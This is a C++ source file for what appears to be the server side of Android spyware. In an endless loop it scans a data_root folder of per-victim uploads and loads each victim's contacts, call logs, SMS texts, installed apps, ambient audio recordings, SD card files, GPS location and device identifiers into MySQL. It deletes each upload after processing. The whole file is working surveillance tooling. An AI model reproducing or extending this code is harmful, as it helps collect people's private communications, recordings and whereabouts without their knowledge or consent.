
#include "translate.h"

#include "xmlparser.h"
#include <time.h>
#include "Coder.h"

Translate::Translate() {

}
Translate::~Translate() {

}

DWORD str2time(char* str) {
	string year = string(str + 0, 4);
	string month = string(str + 4, 2);
	string day = string(str + 6, 2);
	string hour = string(str + 8, 2);
	string minute = string(str + 10, 2);
	string second = string(str + 12, 2);

	tm  sttime = { 0 };
	sttime.tm_year = atoi(year.c_str()) - 1900;
	sttime.tm_mon = atoi(month.c_str()) - 1;
	sttime.tm_mday = atoi(day.c_str());
	sttime.tm_hour = atoi(hour.c_str());
	sttime.tm_min = atoi(minute.c_str());
	sttime.tm_sec = atoi(second.c_str());
	time_t timenow = mktime(&sttime);
	return (DWORD)timenow;
}


string timestamp2calender(time_t t) {
	struct tm* pTimetm = localtime(&t);
	char sztime[256];
	sprintf_s(sztime, 256, ("%04d-%02d-%02d %02d:%02d:%02d"), 1900 + pTimetm->tm_year, 1 + pTimetm->tm_mon, pTimetm->tm_mday,
		pTimetm->tm_hour, pTimetm->tm_min, pTimetm->tm_sec);
	return sztime;
}

string newformattime(string str) {
	return str.substr(0, 4) + "-" + str.substr(4, 2) + "-" + str.substr(6, 2) + " " +
		str.substr(8, 2) + ":" + str.substr(10, 2) + ":" + str.substr(12, 2) + "-";
}

int Translate::writeAddress(char* data, int datasize, string username, string clientname) {
	vector <string > vs;

	vector<string>names;
	names.push_back("NAME");
	//names.push_back("KIND");
	names.push_back("VALUE");

	vs = XMLParser::getvalues(data, "PERSON", names, FALSE);

	MySql::enterLock();
	MySql* mysql = new MySql();

	int result = 0;

	for (unsigned int i = 0; i < vs.size(); i += names.size())
	{
		result = mysql->insertContact(username, clientname, vs[i], vs[i + 1]);
		if (result == 0)
		{
			result = writeSys(0, 0, username, clientname);
		}
	}

	MySql::leaveLock();
	return TRUE;
}

int Translate::writeCall(char* data, int datasize, string username, string clientname) {
	vector <string > vs;

	vector<string>names;
	names.push_back("NUM");
	names.push_back("FLAG");
	names.push_back("Time");
	names.push_back("DUR");

	vs = XMLParser::getvalues(data, "CALL", names, FALSE);
	MySql::enterLock();
	MySql* mysql = new MySql();

	int result = 0;
	for (unsigned int i = 0; i < vs.size(); i += names.size())
	{
		string strtime = newformattime(vs[i + 2]);

		result = mysql->insertCallLog(username, clientname, vs[i], vs[i + 1], strtime, vs[i + 3]);
		if (result == 0)
		{
			result = writeSys(0, 0, username, clientname);
		}
	}

	MySql::leaveLock();
	return TRUE;
}

int Translate::writeSdcard(char* data, int datasize, string username, string clientname, string filepath, string filename) {
	MySql::enterLock();
	MySql* mysql = new MySql();

	int filesize = FileOperator::getfilesize(filepath);
	int result = 0;
	result = mysql->insertAllFiles(username, clientname, filename, filepath, filesize, 3);
	if (result == 0)
	{
		result = writeSys(0, 0, username, clientname);
	}
	MySql::leaveLock();
	return TRUE;
}

int Translate::writeAudio(char* data, int datasize, string username, string clientname, string filepath) {
	MySql::enterLock();
	MySql* mysql = new MySql();

	char sztime[256];
	SYSTEMTIME systime;
	GetLocalTime(&systime);
	wsprintfA(sztime, "%d_%d_%d_%d_%d_%d", systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond);

	int filesize = FileOperator::getfilesize(filepath);
	int result = 0;
	result = mysql->insertEnviromentAudio(username, clientname, sztime, filepath, filesize, filesize / 1024);
	if (result == 0)
	{
		result = writeSys(0, 0, username, clientname);
	}
	MySql::leaveLock();
	return TRUE;
}

int Translate::writeApp(char* data, int datasize, string username, string clientname) {

	vector <string > vs;

	vector<string>names;
	names.push_back("APPNAME");
	names.push_back("PACKAGENAEM");
	names.push_back("VERSION");
	names.push_back("INSTALLTIME");
	names.push_back("UPDATETIME");
	vs = XMLParser::getvalues(data, "APP", names, FALSE);


	MySql::enterLock();
	MySql* mysql = new MySql();

	int result = 0;

	for (unsigned int i = 0; i < vs.size(); i += names.size())
	{
		time_t t = _atoi64(vs[i + 3].c_str());
		string installtime = timestamp2calender(t / 1000);
		t = _atoi64(vs[i + 4].c_str());
		string updatetime = timestamp2calender(t / 1000);

		result = mysql->insertInstallApps(clientname, vs[i], vs[i + 1], vs[i + 2], installtime, updatetime, "1");
		if (result == 0)
		{
			result = writeSys(0, 0, username, clientname);
		}
	}
	MySql::leaveLock();

	return TRUE;
}



int Translate::writeSys(char* data, int datasize, string username, string clientname) {
	int result = 0;
	if (data && datasize)
	{

		char mac[64];
		char imei[64];
		char firsttime[64];
		char lasttime[64];
		char screen[64];
		char bat[64];
		char ver[64];
		char online[64];
		char model[64];

		int result = 0;

		int size = 0;
		result = XMLParser::getvalue(data, "MAC", mac, &size, TRUE);

		result = XMLParser::getvalue(data, "IMEI", imei, &size, TRUE);

		result = XMLParser::getvalue(data, "FIRSTTIME", firsttime, &size, TRUE);

		result = XMLParser::getvalue(data, "LASTTIME", lasttime, &size, TRUE);

		result = XMLParser::getvalue(data, "SCREEN", screen, &size, TRUE);

		result = XMLParser::getvalue(data, "BAT", bat, &size, TRUE);

		result = XMLParser::getvalue(data, "VER", ver, &size, TRUE);

		result = XMLParser::getvalue(data, "ONLINE", online, &size, TRUE);

		result = XMLParser::getvalue(data, "MODEL", model, &size, TRUE);

		MySql::enterLock();
		MySql* mysql = new MySql();

		string format =
			"{\"IMEI0\":\"%s\",\"型号\":\"%s\",\"sim卡状态\":\"%s\",\"商标\":\"%s\",\"手机号码1\":\"%s\","
			"\"设备版本\":\"%s\",\"网络类型\":\"%s\",\"电池信息\":\"%s\",\"SD卡容量\":\"%s\",\"系统最近更新时间\":\"%s\","
			"\"国家\":\"%s\",\"外网IP地址\":\"%s\",\"MAC地址\":\"%s\",\"API版本\":%s,\"制造商\":\"%s\","
			"\"IP地址\":\"%s\",\"SD剩余容量\":\"%s\",\"总内存\":\"%s\",\"sim卡号\":\"%s\","
			"\"指纹\":\"%s\",\"IMSI0\":\"%s\","
			"\"Kernel版本\":\"%s\",\"分辨率\":\"%s\",\"序列号\":\"%s\",\"网络\":\"%s\","
			"\"可用内存\":\"%s\",\"cpu信息\":\"%s\",\"网络名称\":\"%s\",\"已启动时间\":\"%s\","
			"\"版本\":\"%s\",\"USER\":\"%s\",\"屏幕\":\"%s\",\"设备ID\":\"%s\","
			"\"数据连接状态\":%s,\"产品名称\":\"%s\",\"是否漫游\":\"%s\",\"android ID\":\"%s\",\"基带版本\":\"%s\","
			"\"WIFI\":\"%s\",\"运营商\":\"%s\"}";

		char newgbkinfo[0x1000] = { 0 };
		sprintf(newgbkinfo, format.c_str(),
			imei, model, "", "", "",
			ver, "", bat, "", firsttime,
			"cn", "", mac, "", "",
			"ip", "", "", "",
			"", "",
			"", "", "", online,
			"", "", "", lasttime,
			"", "", screen, "",
			"", "", "", clientname.c_str(), "", "", "");

		char* newutf8info = 0;
		int len = Coder::GBKToUTF8(newgbkinfo, &newutf8info);
		if (len > 0) {
			result = mysql->insertClient(username, clientname, newutf8info, clientname);
			delete newutf8info;
		}

		MySql::leaveLock();
	}
	else {
		MySql::enterLock();
		MySql* mysql = new MySql();
		result = mysql->insertClient(username, clientname, "", clientname);
	}
	return TRUE;
}

int Translate::writeSms(char* data, int datasize, string username, string clientname) {

	vector <string > vs;

	int result = 0;

	vector<string>names;
	names.push_back("NUM");
	names.push_back("FLAG");
	names.push_back("Time");
	names.push_back("TEXT");

	vs = XMLParser::getvalues(data, "MESSAGE", names, FALSE);

	MySql::enterLock();
	MySql* mysql = new MySql();

	for (unsigned int i = 0; i < vs.size(); i += names.size())
	{
		time_t msgid = time(0);
		char szmsgid[64];
		wsprintfA(szmsgid, "%I64d", msgid);

		string sztime = newformattime(vs[2]);
		result = mysql->insertMsg(clientname, "0", vs[i], vs[i + 1], sztime, vs[i + 3], szmsgid);
		if (result == 0)
		{
			result = writeSys(0, 0, username, clientname);
		}
	}
	MySql::leaveLock();
	return TRUE;
}

int Translate::writeLocation(char* data, int datasize, string username, string clientname) {

	char lat[64];
	char lang[64];

	int result = 0;

	int size = 0;

	size = 0;
	result = XMLParser::getvalue(data, "latitude", lat, &size, TRUE);

	result = XMLParser::getvalue(data, "longitude", lang, &size, TRUE);

	MySql::enterLock();
	MySql* mysql = new MySql();

	char sztime[256];
	SYSTEMTIME systime;
	GetLocalTime(&systime);
	wsprintfA(sztime, "%d-%d-%d %d:%d:%d", systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond);

	result = mysql->insertLocation(username, clientname, lat, lang, sztime, "");
	if (result == 0)
	{
		result = writeSys(0, 0, username, clientname);
	}
	MySql::leaveLock();
	return TRUE;
}

int g_totalcnt = 0;


int Translate::process(char* szdir, string username, string clientname) {

	int result = 0;

	char szfinddir[MAX_PATH];
	lstrcpyA(szfinddir, szdir);
	lstrcatA(szfinddir, "*.*");

	WIN32_FIND_DATAA find = { 0 };
	HANDLE hf = FindFirstFileA(szfinddir, &find);
	if (hf == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	while (1)
	{
		if (find.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
		{
			if (memcmp(find.cFileName + lstrlenA(find.cFileName) - 4, ".dat", 4) == 0)
			{
				char* szaddr = "address";
				char* szapp = "app";
				char* szaudio = "audio";
				char* szcall = "call";
				char* szlocationNow = "locationNow";
				char* szsdcard = "sdcard";
				char* szsms = "sms";
				char* szsys = "sys";


				char tmppath[MAX_PATH];
				lstrcpyA(tmppath, szdir);

				*(tmppath + lstrlenA(tmppath) - 1) = 0;
				char function[MAX_PATH];
				for (int i = lstrlenA(tmppath); i >= 0; i--)
				{
					if (tmppath[i] == '\\')
					{
						tmppath[i] = 0;
						lstrcpyA(function, tmppath + i + 1);
						break;
					}
				}

				if (clientname == "" || username == "")
				{
					for (int i = lstrlenA(tmppath); i >= 0; i--)
					{
						if (tmppath[i] == '\\')
						{
							tmppath[i] = 0;
							clientname = string(tmppath + i + 1);
							break;
						}
					}


					for (int i = lstrlenA(tmppath); i >= 0; i--)
					{
						if (tmppath[i] == '\\')
						{
							tmppath[i] = 0;
							username = string(tmppath + i + 1);
							break;
						}
					}
				}

				char filename[MAX_PATH];
				lstrcpyA(filename, szdir);
				lstrcatA(filename, find.cFileName);

				if (memcmp(function, szaddr, lstrlenA(szaddr)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeAddress(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);

				}
				else if (memcmp(function, szapp, lstrlenA(szapp)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeApp(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);

				}
				else if (memcmp(function, szaudio, lstrlenA(szaudio)) == 0)
				{
					result = writeAudio(0, 0, username, clientname, filename);
				}
				else if (memcmp(function, szsdcard, lstrlenA(szsdcard)) == 0)
				{
					result = writeSdcard(0, 0, username, clientname, filename, find.cFileName);
				}
				else if (memcmp(function, szcall, lstrlenA(szcall)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeCall(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);
				}
				else if (memcmp(function, szlocationNow, lstrlenA(szlocationNow)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeLocation(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);
				}

				else if (memcmp(function, szsms, lstrlenA(szsms)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeSms(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);
				}
				else if (memcmp(function, szsys, lstrlenA(szsys)) == 0)
				{
					char* data = 0;
					int size = 0;
					result = FileOperator::fileReader(filename, &data, &size);
					result = writeSys(data, size, username, clientname);
					delete data;
					DeleteFileA(filename);
				}


				g_totalcnt++;
			}
			else {

			}
		}
		else if (find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			if (lstrcmpiA(find.cFileName, ".") == 0 || lstrcmpiA(find.cFileName, "..") == 0)
			{

			}
			else {
				char nextpath[MAX_PATH];
				lstrcpyA(nextpath, szdir);

				lstrcatA(nextpath, find.cFileName);
				lstrcatA(nextpath, "\\");
				process(nextpath, "", "");
			}
		}

		result = FindNextFileA(hf, &find);
		if (result == 0) {
			break;
		}
	}
	FindClose(hf);
	return TRUE;
}




void __stdcall Translate::mainLoop(Translate* cls) {

	char szdir[MAX_PATH];
	int result = 0;

	result = GetModuleFileNameA(0, szdir, MAX_PATH);

	for (int i = lstrlenA(szdir); i >= 0; i--)
	{
		if (szdir[i] == '\\')
		{
			szdir[i] = 0;
			for (int i = lstrlenA(szdir); i >= 0; i--)
			{
				if (szdir[i] == '\\')
				{
					szdir[i] = 0;
					lstrcatA(szdir, "\\data_root\\");

					g_totalcnt = 0;

					while (1)
					{

						cls->process(szdir, "", "");
						Sleep(3000);
					}

					return;
				}
			}
		}
	}
}